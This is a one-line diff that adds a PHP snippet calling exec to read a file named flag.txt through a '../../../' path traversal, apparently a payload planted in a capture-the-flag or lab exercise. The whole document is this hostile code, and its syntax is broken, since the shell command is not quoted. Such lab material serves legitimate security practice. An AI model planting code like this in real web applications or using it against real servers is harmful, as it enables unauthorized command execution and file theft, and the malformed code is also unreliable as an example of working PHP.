@@ -1,0 +1,1 @@
+<?php exec(cat ../../../var/flag.txt) ?>
